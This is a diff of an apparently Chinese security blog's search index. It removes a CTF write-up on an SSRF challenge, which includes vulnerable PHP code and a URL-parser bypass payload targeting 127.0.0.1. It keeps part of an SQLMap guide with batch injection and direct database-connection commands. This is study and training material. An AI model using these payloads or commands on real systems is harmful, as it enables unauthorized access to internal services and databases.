&#125; . * + ? ^ $ \ |</span></span><br><span class="line">    <span class="comment">// . 匹配除换行符以外的任意字符</span></span><br><span class="line">    <span class="comment">// * 匹配前面的子表达式零次或多次</span></span><br><span class="line">    <span class="comment">// $ 匹配行的结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>); </span><br><span class="line">        <span class="comment">// 分解出一个URL的各个部分，返回数组。这是 php 的方法，各种语言对 URL 各部分解析规则会各不一样</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();  <span class="comment"># 初始化</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);  <span class="comment">#  //抓取URL并把它传递给浏览器，实际上由于解析规则，获得的域名与 php parse_url 方法获得的不一样</span></span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close(<span class="variable">$ch</span>); </span><br><span class="line">        var_dump(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    safe_request_url(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>URL 都要经过 check_inner_ip 函数检测，但 php_url_parse 和 curl 对 url 的解析是不同的，强烈看看这篇文章 <a href="https://www.anquanke.com/post/id/86527">【Blackhat】SSRF的新纪元：在编程语言中利用URL解析器</a><br> <img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_ssrf_1_url.png" alt="ssrf"></p>
-</li>
-<li><p>直接构造<code>?url=http://a@127.0.0.1:80@baidu.com/flag.php</code></p>
-</li>
-<li><p>后续还有 MySQL、Redies，我是跟着这个博客做的 <a href="https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5C">《从0到1：CTFer成长之路》 配套题目Web WP</a></p>
-<ol>
-<li>查看已经运行的docker镜像 <code>sudo docker ps -a</code></li>
-<li>连接到mysql镜像中 <code>sudo docker exec -it 2-web-ssrf_mysql_1 bash</code>,2-web-ssrf_mysql_1 在上一步查看镜像时 NAMES 的内容。<a href="https://www.php.cn/docker/445365.html">怎么访问docker内的MySQL</a></li>
-</ol>
-<ul>
-<li>将 docker 容器中的文件传递到主机:<code>sudo docker cp 2-web-ssrf_mysql_1:/pcap/mysql.pcap /home/chang/</code></li>
-</ul>
-</li>
-</ol>
-<h2 id="2-2-命令执行漏洞"><a href="#2-2-命令执行漏洞" class="headerlink" title="2.2 命令执行漏洞"></a>2.2 命令执行漏洞</h2><p>这道题主要是看博文，弄懂 linux文件描述符 和 反弹shell原理再看 writeup 基本上没什么难度了。</p>
-<ul>
-<li><a href="https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5C">《从0到1：CTFer成长之路》 配套题目Web WP</a></li>
-<li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_1">反弹Shell原理及检测技术研究</a></li>
-<li><a href="https://cs-cshi.github.io/2021/03/23/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/">彻底弄懂 Linux 下的文件描述符（fd）</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>CTF</category>
-        <category>《从0到1：CTFer成长之路》</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>超详细SQLMap使用攻略及技巧分享</title>
     <url>/%E8%B6%85%E8%AF%A6%E7%BB%86SQLMap%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5%E5%8F%8A%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB/%E8%B6%85%E8%AF%A6%E7%BB%86SQLMap%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5%E5%8F%8A%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB/</url>
     <content><![CDATA[<p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
@@ -1916,7 +1713,7 @@ Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱�
 <p>将该url使用sqlmap进行注入测试，，测试结果可能存在SQL注入，也可能不存在SQL注入，存在则可以进行数据库名称，数据库表以及数据的操作。</p>
 <p><strong>4. 批量检测</strong><br>将目标url搜集并整理为txt文件，如图4所示，所有文件都保存为tg.txt，然后使用“sqlmap.py-m tg.txt”，注意tg.txt跟sqlmap在同一个目录下。<br><img src="%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80.jpg" alt="批量整理目标地址"></p>
 <h3 id="1-4-2-直接连接数据库"><a href="#1-4-2-直接连接数据库" class="headerlink" title="1.4.2 直接连接数据库"></a>1.4.2 直接连接数据库</h3><blockquote>
-<p>sqlmap.py -d”mysql://admin:<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x32;&#49;&#x2e;&#x31;&#x37;">&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x32;&#49;&#x2e;&#x31;&#x37;</a>:3306/testdb” -f –banner –dbs–users</p>
+<p>sqlmap.py -d”mysql://admin:<a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#50;&#49;&#46;&#49;&#x37;">&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#50;&#49;&#46;&#49;&#x37;</a>:3306/testdb” -f –banner –dbs–users</p>
 </blockquote>
 <h3 id="1-4-3数据库相关操作"><a href="#1-4-3数据库相关操作" class="headerlink" title="1.4.3数据库相关操作"></a>1.4.3数据库相关操作</h3><ul>
 <li>列数据库信息：–dbs</li>
